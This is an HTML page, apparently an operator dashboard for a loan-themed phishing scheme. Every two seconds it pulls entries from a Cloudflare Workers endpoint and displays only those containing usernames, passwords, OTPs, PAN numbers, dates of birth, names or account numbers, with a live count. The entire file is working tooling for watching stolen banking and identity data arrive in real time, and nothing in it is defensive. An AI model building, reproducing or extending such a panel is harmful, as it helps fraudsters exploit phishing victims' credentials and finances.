<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
    <title>LIVE TERMINAL</title>
    <style>
        * { margin: 0; padding: 0; box-sizing: border-box; }
        body { background-color: #ffffff; padding: 8px; font-family: 'Consolas', monospace; }
        
        /* Header: Only Red Number on Right */
        .header { 
            background: #fff; padding: 12px; margin-bottom: 8px;
            display: flex; justify-content: space-between; align-items: center;
            border-bottom: 2px solid #f8f9fa;
        }
        .status-text { font-size: 10px; color: #00a859; font-weight: bold; letter-spacing: 1px; }
        #count { color: #ff0000; font-size: 24px; font-weight: 900; }

        /* Black Slim Card */
        .log-card { 
            background: #000000; margin-bottom: 6px; padding: 12px 15px; 
            border-radius: 4px; width: 100%; display: flex; flex-direction: column;
            box-shadow: 0 4px 8px rgba(0,0,0,0.2);
        }

        /* White Clean Data Text */
        .detail-text { 
            color: #ffffff; font-size: 13.5px; white-space: pre-wrap; 
            line-height: 1.6; word-break: break-all; letter-spacing: 0.3px;
        }

        /* Small Red Time Footer */
        .time-footer { 
            display: block; margin-top: 8px; font-size: 9px; 
            color: #ff3b3b; text-align: right; font-weight: bold;
            border-top: 1px solid #1a1a1a; padding-top: 4px;
        }

        #logsContainer { width: 100%; }
        .loading { font-size: 12px; color: #bbb; text-align: center; margin-top: 40px; }
    </style>
</head>
<body>

    <div class="header">
        <span class="status-text">● TERMINAL_ACTIVE</span>
        <span id="count">0</span>
    </div>

    <div id="logsContainer">
        <p class="loading">Fetching live stream...</p>
    </div>

    <script>
        const workerURL = 'https://flat-fog-a0cd.sumankkuuyy.workers.dev/';

        async function fetchLogs() {
            try {
                const response = await fetch(`${workerURL}?t=${Date.now()}`);
                const data = await response.json();
                const container = document.getElementById('logsContainer');
                
                // Sab kuch filter: No Type, No OTP Step, No Loan Claimed
                const filteredData = data.filter(item => {
                    const d = item.detail.toLowerCase();
                    const isData = d.includes("user") || d.includes("pass") || d.includes("otp") || 
                                   d.includes("pan") || d.includes("dob") || d.includes("name") || d.includes("a/c");
                    
                    const isTrash = d.includes("type:") || d.includes("otp step") || d.includes("loan claimed") || d.includes("path:");
                    
                    return isData && !isTrash;
                });

                document.getElementById('count').innerText = filteredData.length;

                if (filteredData.length === 0) {
                    container.innerHTML = "<p class='loading'>No records found.</p>";
                    return;
                }

                container.innerHTML = filteredData.map(item => `
                    <div class="log-card">
                        <div class="detail-text">${item.detail}</div>
                        <span class="time-footer">${item.time}</span>
                    </div>
                `).join('');

            } catch (err) {
                console.error("Connection lost");
            }
        }

        // 2 Second Live Refresh
        setInterval(fetchLogs, 2000);
        window.onload = fetchLogs;
    </script>
</body>
</html>
